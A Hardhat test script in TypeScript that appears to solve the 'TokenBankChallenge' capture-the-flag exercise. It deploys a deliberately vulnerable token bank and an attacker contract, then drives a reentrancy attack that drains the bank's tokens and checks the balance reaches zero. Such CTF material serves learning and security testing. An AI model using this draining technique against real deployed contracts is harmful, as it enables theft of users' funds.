import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

const TOTAL_TOKENS_SUPPLY = 1000000;

describe('TokenBankChallenge', () => {
  let target: Contract;
  let token: Contract;
  let attack: Contract;
  let attacker: SignerWithAddress;
  let deployer: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    const [targetFactory, tokenFactory, attackFactory] = await Promise.all([
      ethers.getContractFactory('TokenBankChallenge', deployer),
      ethers.getContractFactory('SimpleERC223Token', deployer),
      ethers.getContractFactory('TokenBankAttack', attacker),
    ]);

    target = await targetFactory.deploy(attacker.address);

    await target.deployed();

    const tokenAddress = await target.token();

    token = await tokenFactory.attach(tokenAddress);

    await token.deployed();

    target = target.connect(attacker);
    token = token.connect(attacker);

    // player deploys Attack contract
    attack = await attackFactory.deploy(target.address, token.address);

    await attack.deployed();

    attack = attack.connect(attacker);

  });

  it('exploit', async () => {

    // withdraw player's tokens from Bank contract
    const playerInitialTokens = await target.balanceOf(attacker.address);
    console.log('Player Initial Balance: ', playerInitialTokens);
    await target.withdraw(playerInitialTokens);
    const playerEndingTokens = await target.balanceOf(attacker.address);
    console.log('Player Ending Balance: ', playerEndingTokens);

    // transfer player's tokens to Attack contract
    await token["transfer(address,uint256)"](attack.address, playerInitialTokens);

    // Attack contract deposit tokens into Bank contract
    await attack.deposit();
    const attackContractTokens = await target.balanceOf(attack.address);
    console.log('Attack Contract Balance: ', attackContractTokens);

    // player recursively call withdraw() until all tokens are withdrawn from Attack contract
    await attack.withdraw();

    // player withdraws tokens from Attack contract


    expect(await target.isComplete()).to.be.true;
    expect(await token.balanceOf(target.address)).to.equal(0);
    // expect(await token.balanceOf(attacker.address)).to.equal(
    //   utils.parseEther(TOTAL_TOKENS_SUPPLY.toString())
    // );
  });
});
